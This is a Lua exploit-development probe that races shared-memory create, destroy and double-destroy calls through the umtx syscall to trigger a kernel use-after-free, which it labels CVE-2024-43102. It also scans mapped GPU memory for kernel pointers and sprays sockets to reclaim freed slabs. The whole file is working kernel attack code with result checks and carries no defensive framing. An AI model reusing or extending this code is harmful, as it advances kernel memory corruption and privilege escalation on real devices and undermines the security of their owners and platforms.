-- CRASH_CLASS: HIGH
-- PROBE 152d: Clean SHM UAF race — thread does counter work, main does SHM
--
-- Context: 152c CONFIRMED threading + SHM work together. Thread output
-- was binary garbage (thread wrote to stdout). This version keeps threads
-- doing only Atomic_fetch_add on a shared counter while main thread
-- does SHM create/destroy/double-destroy racing.
--
-- CVE-2024-43102 confirmed open on 14.10:
--   - Double destroy returns 0 both times
--   - alive() returns 0 after destroy (dangling reference)
--   - libc_addrofs.Thrd_create works for multi-threading

print("=== PROBE 152d: CLEAN SHM RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

-- Check threading
local tc_addr = libc_addrofs and libc_addrofs.Thrd_create
local af_addr = libc_addrofs and libc_addrofs.Atomic_fetch_add_8
local tj_addr = libc_addrofs and libc_addrofs.Thrd_join

if not tc_addr then
    print("ERROR: no threading available")
    print("canary=" .. to_num(syscall.getpid()))
    return
end
print("threads: OK")

-- ============================================================
-- SECTION A: Spawn worker threads (counter increment only)
-- ============================================================
print("")
print("--- SECTION A: SPAWN THREADS ---")

-- Shared counter for threads
local counter = memory.alloc(0x40)
memory.write_qword(counter, uint64(0))

-- Spawn 3 threads — each will do Atomic_fetch_add on counter
local threads = {}
for i = 1, 3 do
    local ok_t, tid = pcall(function()
        return native.fcall_with_rax(tc_addr, counter, af_addr, counter)
    end)
    if ok_t then
        threads[#threads + 1] = tid
        print("thread" .. i .. "=tid" .. tostring(tid))
    else
        print("thread" .. i .. " FAIL")
    end
end
print("spawned=" .. #threads)

-- ============================================================
-- SECTION B: SHM RACE while threads run (100 cycles)
-- ============================================================
print("")
print("--- SECTION B: SHM RACE (100 CYCLES) ---")

local key = memory.alloc(0x20)
local dd_success = 0
local dd_alive = 0
local create_ok = 0
local crash_count = 0

for i = 1, 100 do
    memory.write_qword(key, uint64(0xAA000000 + i))

    -- Create
    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok1 and to_num(r1) == 0 then create_ok = create_ok + 1 end

    -- Destroy #1
    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    -- Destroy #2 (double-free)
    local ok3, r3 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    if ok2 and ok3 and to_num(r2) == 0 and to_num(r3) == 0 then
        dd_success = dd_success + 1
    end

    -- Alive check (should fail if properly destroyed)
    local ok4, r4 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    if ok4 and to_num(r4) == 0 then
        dd_alive = dd_alive + 1
    end

    if not ok1 or not ok2 or not ok3 then
        crash_count = crash_count + 1
        if crash_count >= 5 then
            print("too many crashes, stopping at cycle " .. i)
            break
        end
    end
end
print(string.format("create_ok=%d dd_success=%d dd_alive=%d crashes=%d",
    create_ok, dd_success, dd_alive, crash_count))

-- ============================================================
-- SECTION C: Join threads, check counter
-- ============================================================
print("")
print("--- SECTION C: JOIN THREADS ---")

for _, tid in ipairs(threads) do
    pcall(function() native.fcall_with_rax(tj_addr, tid, uint64(0)) end)
end
local ctr_val = safe_rq(counter)
print("counter=" .. fmt_addr(ctr_val) .. " (" .. to_num(ctr_val) .. ")")
print("threads joined")

-- ============================================================
-- SECTION D: GPU mmap scan after race
-- ============================================================
print("")
print("--- SECTION D: GPU MMAP POST-RACE ---")

local ok_g, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok_g then
    local gh, gl = get_hi_lo(gpu)
    print(string.format("gpu=0x%X%08X", gh, gl))

    local kptr = 0
    local samples = {}
    for off = 0, 4 * 0x4000 - 8, 8 do
        local val = safe_rq(gpu + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
                kptr = kptr + 1
                if #samples < 5 then
                    samples[#samples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
                end
            end
        end
    end
    print("kptr=" .. kptr)
    for _, s in ipairs(samples) do print(s) end
else
    print("gpu mmap failed")
end

-- ============================================================
-- SECTION E: Socket spray for slab reclaim
-- ============================================================
print("")
print("--- SECTION E: SOCKET SPRAY ---")

-- After SHM double-free, spray sockets to try to reclaim freed slabs
local sc_socket = make_syscall(97)
local fds = {}
for i = 1, 20 do
    local ok_s, fd = pcall(function()
        return sc_socket(uint64(2), uint64(1), uint64(0))
    end)
    if ok_s and to_num(fd) >= 0 then
        fds[#fds + 1] = to_num(fd)
    end
end
print("sockets_created=" .. #fds)

-- Do one more SHM alive check on old keys
local post_alive = 0
for i = 1, 10 do
    memory.write_qword(key, uint64(0xAA000000 + i))
    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    if ok and to_num(ret) == 0 then post_alive = post_alive + 1 end
end
print("post_spray_alive=" .. post_alive .. "/10")

-- Close sockets
local sc_close = make_syscall(6)
for _, fd in ipairs(fds) do
    pcall(function() sc_close(uint64(fd)) end)
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152d COMPLETE ===")
